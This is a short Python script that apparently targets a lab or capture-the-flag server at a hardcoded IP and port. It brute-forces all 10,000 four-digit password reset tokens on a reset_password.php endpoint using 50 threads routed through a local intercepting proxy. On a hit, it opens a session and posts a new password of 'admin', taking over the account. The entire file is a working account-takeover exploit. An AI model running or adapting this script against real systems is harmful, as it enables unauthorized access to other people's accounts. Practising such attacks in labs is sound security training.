#!/usr/bin/env python3
import requests  # For making HTTP requests
from concurrent.futures import ThreadPoolExecutor, as_completed  # For multithreading
import sys  

def try_token(url, proxies):
    try:
        resp = requests.get(url, proxies=proxies, verify=False, timeout=10)
        reset_token = url.split("=")[-1]
        err_msg = 'The provided token is invalid'

        if err_msg not in resp.text:
            return reset_token  
        else:
            # print(f'Invalid token: {reset_token}')
            return None        
    except Exception as e:
        print(f'Error for {url}: {e}')
        sys.exit(1)

if __name__ == "__main__":
    # Define the target host and port for the password reset endpoint
    host = '94.237.57.211'  # Target server IP or hostname
    port = '56926'          # Target server port
    base_url = f'http://{host}:{port}/reset_password.php?token='

    max_threads = 50      # Number of threads to use for concurrent requests
    max_token = 9999      # Maximum token value (4 digits, from 0000 to 9999)
    batch_size = 1000     # Number of tokens to try per batch (to avoid too many threads at once)

    # Proxy settings for requests. This is useful if you want to intercept traffic with a tool like Burp Suite.
    proxies = {
        'http': 'http://127.0.0.1:8080',  # HTTP proxy address
        'https': 'http://127.0.0.1:8080'  # HTTPS proxy address
    }

    # Loop through all possible tokens in batches
    for batch_start in range(0, max_token + 1, batch_size):
        # Create a thread pool for the current batch
        with ThreadPoolExecutor(max_threads) as executor:
            futures = []  # List to keep track of all submitted tasks in this batch
            # For each token in the current batch
            for i in range(batch_start, min(batch_start + batch_size, max_token + 1)):
                reset_token = f"{i:04d}"  # Format the token as a zero-padded 4-digit string
                url = base_url + reset_token
                futures.append(executor.submit(try_token, url, proxies))

            # Wait for all threads in this batch to finish, or stop early if a valid token is found
            for future in as_completed(futures):
                reset_token_found = future.result()
                if reset_token_found:
                    # Stop all threads and exit if a valid token is found
                    print(f'Found valid reset token in batch: {reset_token_found}')

                    reset_url = f'http://{host}:{port}/reset_password.php?token={reset_token_found}'
                    post_data = "password=admin"

                    # When reset url gets accessed with the correct token, a session cookie is set
                    session = requests.Session()
                    reset_session = session.get(reset_url, proxies=proxies, verify=False, timeout=10)
                    reset_response = session.post(reset_url, data=post_data, proxies=proxies, verify=False, timeout=10)

                    sys.exit(0)
